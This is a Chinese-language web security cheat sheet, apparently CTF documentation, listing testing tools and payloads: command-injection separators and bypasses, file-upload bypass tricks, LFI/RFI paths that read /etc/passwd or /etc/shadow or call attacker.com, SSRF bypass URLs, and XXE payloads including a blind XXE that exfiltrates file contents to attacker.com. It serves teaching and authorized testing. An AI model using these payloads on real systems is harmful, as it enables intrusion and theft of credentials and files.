# 其他Web工具

其他常用的Web安全测试工具。

## 综合工具

### Burp Suite
**链接**: [https://portswigger.net/burp](https://portswigger.net/burp)

**功能**: Web安全测试集成平台

**特点**:
- Proxy代理拦截
- Repeater重放器
- Intruder暴力破解
- Scanner漏洞扫描
- Decoder编码解码

### OWASP ZAP
**链接**: [https://www.zaproxy.org/](https://www.zaproxy.org/)

**功能**: 开源Web安全扫描器

**特点**:
- 完全免费
- 自动扫描
- API支持

### HackBar
**链接**: Chrome/Firefox插件

**功能**: 浏览器安全测试工具栏

**特点**:
- 快速编码解码
- SQL/XSS payload
- POST数据修改

## 请求测试

### RequestBin
**链接**: [https://requestbin.com/](https://requestbin.com/)

**功能**: HTTP请求收集器

**特点**:
- 查看请求详情
- Webhook测试
- SSRF探测

### Webhook.site
**链接**: [https://webhook.site/](https://webhook.site/)

**功能**: 临时URL接收器

**特点**:
- 实时显示请求
- 支持WebSocket
- 自定义响应

### httpbin
**链接**: [https://httpbin.org/](https://httpbin.org/)

**功能**: HTTP请求测试服务

**特点**:
- 各种HTTP方法测试
- 响应格式测试
- 开源可自建

## 命令注入

### Command Injection Payloads
**参考**: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

**常用Payload**:
```bash
# 分隔符
; ls
| ls
|| ls
& ls
&& ls
`ls`
$(ls)

# 换行
%0als

# 绕过过滤
l''s
l""s
l\s
l$@s
```

## 文件上传

### Upload Labs
**链接**: [https://github.com/c0ny1/upload-labs](https://github.com/c0ny1/upload-labs)

**功能**: 文件上传漏洞靶场

**特点**:
- 20个关卡
- 各种绕过技巧
- 本地练习

### 绕过技巧

#### 前端绕过
- 禁用JavaScript
- 修改表单验证

#### MIME类型绕过
```
Content-Type: image/jpeg
```

#### 扩展名绕过
```
.php
.php3, .php4, .php5, .phtml
.asp, .aspx, .asa, .cer, .cdx
.jsp, .jspx
```

#### 双扩展名
```
shell.php.jpg
shell.jpg.php
```

#### 大小写绕过
```
shell.PhP
shell.AsP
```

#### 空字节绕过
```
shell.php%00.jpg
```

#### .htaccess绕过
```apache
AddType application/x-httpd-php .jpg
```

## 文件包含

### LFI/RFI Payloads

#### 本地文件包含 (LFI)
```
/etc/passwd
/etc/shadow
C:\Windows\System32\drivers\etc\hosts
../../../etc/passwd
....//....//etc/passwd

# PHP伪协议
php://filter/read=convert.base64-encode/resource=index.php
php://input (POST数据)
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
```

#### 远程文件包含 (RFI)
```
http://attacker.com/shell.txt
ftp://attacker.com/shell.txt
\\attacker.com\share\shell.txt
```

## SSRF

### SSRF测试平台
**工具**: 
- [https://webhook.site/](https://webhook.site/)
- [http://requestbin.net/](http://requestbin.net/)

### 常用Payload
```
# 基础
http://localhost/
http://127.0.0.1/
http://0.0.0.0/

# IP绕过
http://127.1/
http://127.0.1/
http://2130706433/ (十进制)
http://0x7f.0x0.0x0.0x1/ (十六进制)

# DNS Rebinding
http://A.B.C.D.xip.io/

# 跳转绕过
http://evil.com/redirect.php?url=http://localhost/

# URL解析
http://example.com@localhost/
http://localhost#example.com
```

## XXE注入

### 常用Payload

#### 读取文件
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

#### 外部DTD
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
%xxe;
]>
```

#### Blind XXE
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

## JSON Web Token (JWT)

### JWT在线工具
**链接**: [https://jwt.io/](https://jwt.io/)

**功能**: JWT解码和调试

### 常见攻击

#### 算法混淆
```
# 将RS256改为HS256
# 用公钥作为密钥签名
```

#### 空签名
```
# alg设为none
# 删除签名部分
```

#### 弱密钥爆破
**工具**: [jwt-cracker](https://github.com/lmammino/jwt-cracker)

## CTF解题技巧

!!! tip "信息收集"
    - robots.txt
    - .git泄露
    - 备份文件(.bak, .swp, ~)
    - 目录遍历
    - 源码注释

!!! tip "常见漏洞组合"
    - 文件上传 + 文件包含
    - SSRF + Redis/FastCGI
    - XXE + SSRF
    - SQL注入 + 文件写入
